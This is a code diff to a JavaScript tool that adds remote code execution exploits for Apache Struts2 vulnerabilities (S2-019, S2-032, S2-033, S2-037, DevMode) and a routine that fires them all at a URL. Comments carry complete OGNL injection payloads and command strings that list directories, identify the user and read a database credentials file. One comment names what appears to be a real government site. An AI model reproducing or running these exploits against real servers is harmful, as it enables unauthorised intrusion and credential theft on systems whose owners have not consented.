@@ -202,6 +202,41 @@ function doStruts2_046(url)
     });
 }
 
+// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
+function doStruts2_032(url)
+{
+	var oParms = {};
+	oParms["method:" + encodeURIComponent(g_postData)] = "";
+	oParms["mtxtest"] = "ok";
+	request({method: 'POST',uri: url,"formData":oParms},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-032");
+    });
+}
+
+// s2-033,s2-037
+// s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
+function doStruts2_037(url)
+{
+	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
+	request({method: 'POST',uri: url},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-037");
+    });
+}
+// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
+function doStruts2_033(url)
+{
+	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
+	request({method: 'POST',uri: url},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-037");
+    });
+}
+   
 
 function doStruts2_048(url,fnCbk)
 {
@@ -232,6 +267,7 @@ function doStruts2_048(url,fnCbk)
 }
 
 // http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
+// s2_016,s2_017
 function doStruts2_016(url)
 {
 	/*///////////
@@ -312,12 +348,42 @@ function doStruts2_045(url, fnCbk)
 	    ,headers:
 	    {
 	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
-	    	"Content-Type":g_postData
+	    	"Content-Type":encodeURIComponent(g_postData)
 	    }}
 	  , function (error, response, body){
 	  		if(body)
 	  		{
 	  			fnDoBody(body,"s2-045");
+	  		}
+	    }
+	  );
+}
+
+// S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
+function doStruts2_DevMode(url)
+{
+	request({method: 'POST',uri: url + "?debug=browser&object=" + encodeURIComponent(g_postData)},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-DevMode");
+    });
+}
+//
+function doStruts2_019(url, fnCbk)
+{
+	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
+	//  && cat #curPath/WEB-INF/jdbc.propertis
+	request({method: 'POST',uri: url,
+		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
+	    ,headers:
+	    {
+	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"Content-Type":"application/x-www-form-urlencoded"
+	    }}
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			fnDoBody(body,"s2-019");
 	  		}
 	    }
 	  );
@@ -338,9 +404,14 @@ function fnTestAll()
 if(0 < a.length)
 {
 	doStruts2_016(url);
+	doStruts2_019(url);
+	doStruts2_032(url);
+	doStruts2_033(url);
+	doStruts2_037(url);
 	doStruts2_045(url);
 	doStruts2_046(url);
 	doStruts2_048(url);
+	doStruts2_DevMode(url);
 	
 	fnTestAll();
 }
